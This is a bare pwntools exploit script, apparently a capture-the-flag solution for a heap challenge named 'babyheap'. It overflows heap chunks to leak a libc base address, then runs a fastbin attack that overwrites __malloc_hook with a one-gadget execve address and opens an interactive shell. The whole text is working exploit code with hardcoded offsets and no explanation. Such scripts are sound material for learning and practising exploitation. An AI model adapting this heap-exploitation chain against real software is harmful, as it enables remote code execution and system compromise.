from pwn import *
context(log_level='debug')

DEBUG = 1
if DEBUG:
    p = process('./babyheap')
    libc = ELF('./libc.so.6')
else:
    p = remote()

def alloc(size):
    p.recvuntil('Command:')
    p.sendline('1')
    p.recvuntil('Size:')
    p.sendline(str(size))

def fill(index, size, content):
    p.recvuntil('Command:')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Size:')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.send(content)

def free(index):
    p.recvuntil('Command:')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(index))

def dump(index):
    p.recvuntil('Command:')
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(index))
    p.recvuntil('Content: \n')
    return p.recvline()[:-1]

def leak():
#    gdb.attach(p)
    alloc(0x60)
    alloc(0x40)
    fill(0, 0x60 + 0x10, 'a' * 0x60 + p64(0) + p64(0x71))
    alloc(0x100)
    fill(2, 0x20, 'c' * 0x10 + p64(0) + p64(0x71))
    free(1)
    alloc(0x60)
    fill(1, 0x40 + 0x10, 'b' * 0x40 + p64(0) + p64(0x111))
    alloc(0x50)
    free(2)
    leaked = u64(dump(1)[-8:])
    # return libc_base
    return leaked - 0x3c4b78


def fastbin_attack(libc_base):
    malloc_hook = libc.symbols['__malloc_hook'] + libc_base
    execve_addr = 0x4526a + libc_base

    log.info("malloc_hook @" + hex(malloc_hook))
    log.info("execve_addr @" + hex(execve_addr))
#    gdb.attach(p)
    free(1)
    payload = 'a' * 0x60 + p64(0) + p64(0x71) + p64(malloc_hook - 27 - 0x8) + p64(0)
    fill(0, 0x60 + 0x10 + 0x10, payload)
    
    alloc(0x60)
    alloc(0x60)

    payload  = p8(0) * 3 
    payload += p64(0) * 2
    payload += p64(execve_addr)
    fill(2, len(payload), payload)
    alloc(0x20)

def main():
#    pwnlib.gdb.attach(p)
    libc_base = leak()
    log.info("get libc_base:" + hex(libc_base))
    fastbin_attack(libc_base)
    p.interactive()

if __name__ == "__main__":
    main()
